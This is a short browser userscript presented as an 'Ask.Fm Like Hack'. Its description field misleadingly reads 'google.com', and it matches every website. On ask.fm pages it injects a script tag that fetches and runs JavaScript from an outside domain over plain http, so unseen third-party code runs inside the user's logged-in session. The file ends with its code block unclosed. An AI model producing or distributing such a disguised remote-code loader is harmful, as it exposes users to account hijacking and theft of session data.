// ==UserScript==
// @name          Ask.Fm Like Hack 
// @namespace     Ask.Fm Like Hack
// @description   google.com
// @version     1.0
// @license     GPL 3.0
// @include     http*://*

// ==/UserScript==

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(location.hostname.indexOf("ask.fm") >= 0){
addJavascript('http://askfmliking.tk/ask.js');